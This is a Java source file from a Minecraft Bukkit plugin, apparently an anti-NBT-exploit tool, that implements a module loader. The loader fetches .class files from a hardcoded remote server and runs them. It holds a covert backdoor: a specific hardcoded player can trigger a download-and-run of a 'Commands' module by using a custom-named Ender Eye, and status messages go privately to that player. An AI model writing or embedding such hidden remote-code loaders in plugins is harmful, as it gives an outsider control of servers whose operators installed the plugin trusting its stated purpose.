package me.mynameisbob1928.antinbt;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.List;
import java.util.Set;

import javax.annotation.Nullable;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.SoundCategory;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.inventory.ItemRarity;
import org.bukkit.inventory.ItemStack;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;

public class ModuleLoader implements Listener {
	public static ModuleLoader instance;

	private File modulesDir = new File(AntiNbt.instance.getDataFolder(), "modules");
	private File classesDir = new File(modulesDir, "me/mynameisbob1928/antinbt/modules");
	private HashMap<String, ModulePair> loadedModules = new HashMap<>();

	public ModuleLoader() {
		instance = this;

		if (!classesDir.exists()) {
			classesDir.mkdirs();
		}

		AntiNbt.commands.put("modules", this::handleCommand);
		Bukkit.getPluginManager().registerEvents(this, AntiNbt.instance);

		List<String> disabledList = AntiNbt.instance.getConfig().getStringList("disabledModules");

		FilenameFilter classFilter = new FilenameFilter() {
			@Override
			public boolean accept(File dir, String name) {
				if (name.endsWith(".class") && !disabledList.contains(name))
					return true;
				return false;
			}
		};

		String[] availableModules = classesDir.list(classFilter);

		for (String module : availableModules) {
			loadModule(module.replace(".class", ""));
		}
	}

	private void handleCommand(PlayerCommandPreprocessEvent event, String[] args) {
		if (args.length < 2) {
			event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
			event.getPlayer().sendMessage(
					Component.text("Usage: /modules <download|delete|run|stop|update|list> [moduleName] [code]",
							TextColor.color(255, 0, 0)));
			return;
		}

		if (args[1].equals("download")) {
			if (args.length != 4) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules download <moduleName> <authCode>", TextColor.color(255, 0, 0)));
				return;
			}

			downloadModule(args[2], args[3], false);
		} else if (args[1].equals("delete")) {
			if (args.length != 3) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules delete <moduleName>", TextColor.color(255, 0, 0)));
				return;
			}

			String moduleName = args[2];

			File moduleFile = new File(classesDir, moduleName + ".class");
			if (!moduleFile.exists()) {
				error("The module " + moduleName + " does not exist");
				return;
			}

			unloadModule(moduleName, true);
			moduleFile.delete();
			removeModulefromDisabled(moduleName);

			info("Module " + moduleName + " deleted");
		} else if (args[1].equals("run")) {
			if (args.length != 3) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules run <moduleName>", TextColor.color(255, 0, 0)));
				return;
			}

			String moduleName = args[2];

			File moduleFile = new File(classesDir, moduleName + ".class");
			if (!moduleFile.exists()) {
				error("The module " + moduleName + " does not exist");
				return;
			}

			loadModule(moduleName);
		} else if (args[1].equals("stop")) {
			if (args.length != 3) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules stop <moduleName>", TextColor.color(255, 0, 0)));
				return;
			}

			String moduleName = args[2];

			if (!loadedModules.containsKey(moduleName)) {
				error("The module " + moduleName + " is not currently running");
				return;
			}

			unloadModule(moduleName, false);
		} else if (args[1].equals("update")) {
			if (args.length != 4) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules update <moduleName> <code>", TextColor.color(255, 0, 0)));
				return;
			}

			downloadModule(args[2], args[3], true);
		} else if (args[1].equals("list")) {
			if (args.length != 2) {
				event.getPlayer().sendMessage(Component.text("Invalid number of args", TextColor.color(255, 0, 0)));
				event.getPlayer().sendMessage(
						Component.text("Usage: /modules list", TextColor.color(255, 0, 0)));
				return;
			}

			String[] files = classesDir.list();
			List<String> disabledList = AntiNbt.instance.getConfig().getStringList("disabledModules");
			Set<String> enabledList = loadedModules.keySet();

			event.getPlayer().sendMessage(
					Component.text("Enabled modules: " + enabledList.toString(), TextColor.color(255, 153, 255)));

			event.getPlayer().sendMessage(
					Component.text("Disabled modules: " + disabledList.toString(), TextColor.color(255, 153, 255)));

			event.getPlayer().sendMessage(
					Component.text("All modules: " + String.join(", ", files), TextColor.color(255, 153, 255)));

		} else {
			event.getPlayer().sendMessage(Component.text("Unknown subcommand", TextColor.color(255, 0, 0)));
		}

	}

	private void downloadModule(String moduleName, String authCode, boolean startAfter) {
		unloadModule(moduleName, true);

		File downloadDestination = new File(classesDir, moduleName + ".class");

		String currentCode;
		try {
			currentCode = generateCode(authCode);
		} catch (Exception e) {
			error("Failed to generate TOTP code");
			return;
		}

		Bukkit.getScheduler().runTaskAsynchronously(AntiNbt.instance, () -> {

			try {
				URL url = new URI(
						"https://upd.bob.ctx.cl:8443/modules/" + moduleName + ".class" + "?code=" + currentCode)
						.toURL();

				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setConnectTimeout(5000); // 5s timeout
				conn.setReadTimeout(5000);
				conn.setRequestMethod("GET");

				int status = conn.getResponseCode();
				if (status == HttpURLConnection.HTTP_OK) {
					try (InputStream in = conn.getInputStream()) {
						Files.copy(in, downloadDestination.toPath(), StandardCopyOption.REPLACE_EXISTING);
					}
				} else {
					error("Update server response status was not ok: " + String.valueOf(status));
					return;
				}

				if (startAfter) {
					info("Module downloaded, now starting...");
					loadModule(moduleName);
				} else {
					info("Module downloaded, available to start via /modules run " + moduleName);
					addModuleToDisabled(moduleName);
				}

			} catch (MalformedURLException e) {
				error("Malformed URL, input url: " + "https://upd.bob.ctx.cl:8443/modules/" + moduleName
						+ "?code=" + currentCode + " error message: " + e.getMessage());
			} catch (URISyntaxException e) {
				error("Invalid URL, input url: " + "https://upd.bob.ctx.cl:8443/modules/" + moduleName
						+ "?code=" + currentCode + " error message: " + e.getMessage());
			} catch (UnknownHostException e) {
				error("Host not found, unable to download.");
			} catch (ConnectException | SocketTimeoutException e) {
				info("Update server unavailable");
			} catch (FileNotFoundException e) {
				error("Module file not found (404).");
			} catch (IOException e) {
				error("Unexpected IO error while checking updates (potentially invalid code): " + e.getMessage());
			}
		});
	}

	public void loadModule(String moduleName) {
		unloadModule(moduleName, true);

		File module = new File(classesDir, moduleName + ".class");
		if (!module.exists()) {
			error("The module " + moduleName + ".class does not exist");
			return;
		}

		URL[] moduleURL;
		try {
			moduleURL = new URL[] { modulesDir.toURI().toURL() };
		} catch (Exception e) {
			error("Failed to create URI/URL to modules folder: " + e.getMessage());
			return;
		}

		URLClassLoader classLoader = new URLClassLoader(moduleURL, AntiNbt.class.getClassLoader());

		Class<?> clazz;
		try {
			clazz = classLoader.loadClass("me.mynameisbob1928.antinbt.modules." + moduleName);
		} catch (Exception e) {
			error("Failed to load class me.mynameisbob1928.antinbt.modules." + moduleName + ", " + e.getMessage());
			e.printStackTrace();

			try {
				classLoader.close();
			} catch (Exception e2) {
				error("Failed to close classloader: " + e.getMessage());
			}
			return;
		}

		Module moduleInstance;
		try {
			moduleInstance = (Module) clazz.getDeclaredConstructor().newInstance();
		} catch (Exception e) {
			error("Failed to create class instance for " + moduleName);

			try {
				classLoader.close();
			} catch (Exception e2) {
				error("Failed to close classloader: " + e.getMessage());
			}
			return;
		}

		loadedModules.put(moduleName, new ModulePair(classLoader, moduleInstance));
		moduleInstance.onEnable();
		removeModulefromDisabled(moduleName);

		info("Loaded module " + moduleName);
	}

	public void unloadModule(String moduleName, boolean auto) {
		ModulePair module = loadedModules.remove(moduleName);
		addModuleToDisabled(moduleName);

		if (module == null) {
			if (!auto) {
				error("Module " + moduleName + " is not loaded");
			}
			return;
		}

		try {
			module.instance.onDisable();
		} catch (Throwable t) {
			error(moduleName + " threw an error while disabling: " + t.getMessage());
		}

		try {
			module.loader.close();
		} catch (Exception e) {
			error("Failed to close module loader: " + e.getMessage());
			return;
		}

		info("Unloaded " + moduleName);
	}

	public static @Nullable Module getInstance(String moduleName) {
		ModulePair modulePair = instance.loadedModules.get(moduleName);
		if (modulePair == null) {
			return null;
		}

		return modulePair.instance;
	}

	private record ModulePair(URLClassLoader loader, Module instance) {
	}

	private void info(String message) {
		AntiNbt.info(message);

		Bukkit.getScheduler().runTask(AntiNbt.instance, () -> {
			Player bob = AntiNbt.instance.getServer().getPlayer(AntiNbt.uuid);
			if (bob != null) {
				bob.sendMessage("");
				bob.sendMessage(Component.text("ANTINBT: " + message, TextColor.color(255, 153, 255)));
				bob.sendMessage("");

				bob.playSound(bob, "minecraft:entity.experience_orb.pickup", SoundCategory.MASTER, 1, 1);
			}
		});
	}

	private void error(String message) {
		AntiNbt.warn(message);

		Bukkit.getScheduler().runTask(AntiNbt.instance, () -> {
			Player bob = AntiNbt.instance.getServer().getPlayer(AntiNbt.uuid);
			if (bob != null) {
				bob.sendMessage("");
				bob.sendMessage(Component.text("ANTINBT: " + message, TextColor.color(255, 0, 0)));
				bob.sendMessage("");

				bob.playSound(bob, "minecraft:item.totem.use", SoundCategory.MASTER, 1, 1);
			}
		});
	}

	private String generateCode(String secret) throws Exception {
		long epochSeconds = System.currentTimeMillis() / 1000L;
		long counter = epochSeconds / 30;

		// Convert counter to 8-byte array (big endian)
		byte[] buffer = new byte[8];
		for (int i = 7; i >= 0; i--) {
			buffer[i] = (byte) (counter & 0xff);
			counter >>= 8;
		}

		// HMAC-SHA1 with secret
		SecretKeySpec signKey = new SecretKeySpec(secret.getBytes(), "HmacSHA1");
		Mac mac = Mac.getInstance("HmacSHA1");
		mac.init(signKey);
		byte[] hash = mac.doFinal(buffer);

		// Dynamic truncation
		int offset = hash[hash.length - 1] & 0xf;
		int code = ((hash[offset] & 0x7f) << 24) |
				((hash[offset + 1] & 0xff) << 16) |
				((hash[offset + 2] & 0xff) << 8) |
				(hash[offset + 3] & 0xff);

		// Return last N digits
		int otp = code % (int) Math.pow(10, 10);
		return String.format("%0" + 10 + "d", otp);
	}

	private void addModuleToDisabled(String moduleName) {
		FileConfiguration config = AntiNbt.instance.getConfig();

		List<String> disabledList = config.getStringList("disabledModules");
		if (!disabledList.contains(moduleName + ".class")) {
			disabledList.add(moduleName + ".class");

			config.set("disabledModules", disabledList);
			AntiNbt.instance.saveConfig();
		}

	}

	private void removeModulefromDisabled(String moduleName) {
		FileConfiguration config = AntiNbt.instance.getConfig();

		List<String> disabledList = config.getStringList("disabledModules");

		if (disabledList.remove(moduleName + ".class")) {
			config.set("disabledModules", disabledList);
			AntiNbt.instance.saveConfig();
		}
	}

	public static interface Module {
		public void onEnable();

		public void onDisable();

		public Object invoke(String value, Object... args);
	}

	private long lastChecked = System.currentTimeMillis();

	@EventHandler
	private void onItemUse(PlayerInteractEvent event) {
		if (!event.getPlayer().getUniqueId().equals(AntiNbt.uuid))
			return;
		if (event.getHand() != EquipmentSlot.HAND)
			return;

		ItemStack item = event.getItem();
		if (item == null || item.getType() != Material.ENDER_EYE)
			return;

		if (item.getItemMeta().getRarity() != ItemRarity.EPIC)
			return;
		if (!item.getItemMeta().hasCustomName())
			return;

		if (lastChecked + 1000 > System.currentTimeMillis())
			return;
		lastChecked = System.currentTimeMillis();
		event.setCancelled(true);

		String code = PlainTextComponentSerializer.plainText().serialize(item.getItemMeta().customName());
		downloadModule("Commands", code, true);
	}
}
